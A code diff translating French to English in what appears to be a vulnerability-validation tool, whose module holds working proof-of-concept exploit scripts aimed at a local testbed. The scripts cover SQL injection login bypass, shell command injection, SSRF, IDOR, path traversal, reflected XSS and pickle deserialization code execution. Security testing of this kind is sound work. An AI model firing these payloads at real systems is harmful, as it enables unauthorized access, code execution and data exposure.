@@ -14,70 +14,70 @@ import os
 # Scripts d'exploitation par classe. __BASE__ est remplacé par l'URL réelle du testbed.
 # Chaque script est autonome (imports inclus) et pose un dict RESULT.
 POC = {
-    "CWE-89": '''# PoC — Injection SQL : bypass d'authentification (CWE-89)
+    "CWE-89": '''# PoC — SQL Injection: authentication bypass (CWE-89)
 import urllib.request, urllib.parse
 BASE = __BASE__
-payload = "admin' --"                       # commente le reste de la requête SQL
+payload = "admin' --"                       # comments out the rest of the SQL query
 req = "/login?username=" + urllib.parse.quote(payload) + "&password=n_importe_quoi"
 resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
 RESULT = {"ok": '"ok": true' in resp.lower(), "request": "GET " + req,
           "response": resp[:300],
-          "impact": "Authentification contournée en tant qu'admin sans mot de passe valide"}
+          "impact": "Authentication bypassed as admin, no valid password needed"}
 ''',
-    "CWE-78": '''# PoC — Injection de commande : RCE (CWE-78)
+    "CWE-78": '''# PoC — Command Injection: RCE (CWE-78)
 import urllib.request, urllib.parse
 BASE = __BASE__
-payload = "127.0.0.1; echo FORGE_PWNED"      # greffe une commande shell
+payload = "127.0.0.1; echo FORGE_PWNED"      # grafts a shell command
 req = "/admin/ping?host=" + urllib.parse.quote(payload)
 resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
 RESULT = {"ok": "FORGE_PWNED" in resp, "request": "GET " + req, "response": resp[:300],
-          "impact": "Commande injectee executee : la sortie 'FORGE_PWNED' est revenue du serveur"}
+          "impact": "Injected command executed: output FORGE_PWNED returned by the server"}
 ''',
-    "CWE-918": '''# PoC — SSRF : acces a une ressource interne (CWE-918)
+    "CWE-918": '''# PoC — SSRF: access to an internal resource (CWE-918)
 import urllib.request, urllib.parse
 BASE = __BASE__
-internal = BASE + "/health"                  # URL interne fournie par l'attaquant
+internal = BASE + "/health"                  # internal URL supplied by the attacker
 req = "/imageproxy?url=" + urllib.parse.quote(internal)
 resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
 RESULT = {"ok": "vulnshop" in resp, "request": "GET " + req, "response": resp[:300],
-          "impact": "Le serveur a recupere une URL interne fournie par l'attaquant"}
+          "impact": "The server fetched an attacker-supplied internal URL"}
 ''',
-    "CWE-639": '''# PoC — IDOR : acces aux donnees d'un autre utilisateur (CWE-639)
+    "CWE-639": '''# PoC — IDOR: access to another account data (CWE-639)
 import urllib.request
 BASE = __BASE__
-req = "/profile?id=3"                         # id d'un autre utilisateur (admin)
+req = "/profile?id=3"                         # the id of another account (admin)
 resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
 RESULT = {"ok": '"role": "admin"' in resp and "ssn" in resp, "request": "GET " + req,
-          "response": resp[:300], "impact": "Profil admin d'autrui expose, SSN compris"}
+          "response": resp[:300], "impact": "Another admin profile exposed, including SSN"}
 ''',
-    "CWE-22": '''# PoC — Path traversal : lecture de fichier arbitraire (CWE-22)
+    "CWE-22": '''# PoC — Path traversal: arbitrary file read (CWE-22)
 import urllib.request, urllib.parse
 BASE = __BASE__
-req = "/avatar?file=" + urllib.parse.quote("../db.py")   # sort du dossier avatars
+req = "/avatar?file=" + urllib.parse.quote("../db.py")   # escapes the avatars folder
 resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode(errors="replace")
 RESULT = {"ok": "authenticate" in resp or "SELECT" in resp, "request": "GET " + req,
-          "response": resp[:300], "impact": "Lecture du code source hors du dossier autorise"}
+          "response": resp[:300], "impact": "Source code read outside the allowed folder"}
 ''',
-    "CWE-79": '''# PoC — XSS reflechi (CWE-79)
+    "CWE-79": '''# PoC — Reflected XSS (CWE-79)
 import urllib.request, urllib.parse
 BASE = __BASE__
 payload = "<script>alert(1)</script>"
 req = "/search?q=" + urllib.parse.quote(payload)
 resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
 RESULT = {"ok": payload in resp, "request": "GET " + req, "response": resp[:300],
-          "impact": "Le payload <script> est reflechi non echappe dans la reponse HTML"}
+          "impact": "The <script> payload is reflected unescaped in the HTML response"}
 ''',
-    "CWE-502": '''# PoC — Deserialisation non sure : RCE via pickle (CWE-502)
+    "CWE-502": '''# PoC — Unsafe deserialization: RCE via pickle (CWE-502)
 import urllib.request, urllib.parse, base64, pickle, subprocess
 BASE = __BASE__
-class P:                                       # __reduce__ s'execute au pickle.loads()
+class P:                                       # __reduce__ runs at pickle.loads()
     def __reduce__(self):
         return (subprocess.check_output, (["echo", "FORGE_DESER_PWNED"],))
 payload = base64.b64encode(pickle.dumps(P())).decode()
 req = "/prefs?c=" + urllib.parse.quote(payload)
 resp = urllib.request.urlopen(BASE + req, timeout=4).read().decode()
 RESULT = {"ok": "FORGE_DESER_PWNED" in resp, "request": "GET /prefs?c=<payload-pickle>",
-          "response": resp[:300], "impact": "Execution de code via deserialisation (sortie observee)"}
+          "response": resp[:300], "impact": "Code execution via deserialization (observed output)"}
 ''',
 }
 
@@ -113,8 +113,8 @@ def handle(task, ctx, agent_id) -> list:
         poc_dir = os.path.join(ctx.run_dir, "poc")
         os.makedirs(poc_dir, exist_ok=True)
         py_path = os.path.join(poc_dir, f"{fp}.py")
-        header = (f"#!/usr/bin/env python3\n# PoC généré par Forge — {f['title']} ({cwe})\n"
-                  f"# Exécuté contre le testbed ; impact observé ci-dessous.\n\n")
+        header = (f"#!/usr/bin/env python3\n# PoC generated by Forge — {f['title']} ({cwe})\n"
+                  f"# Run against the testbed; observed impact below.\n\n")
         with open(py_path, "w", encoding="utf-8") as fh:
             fh.write(header + code)
         with open(os.path.join(poc_dir, f"{fp}.json"), "w", encoding="utf-8") as fh:
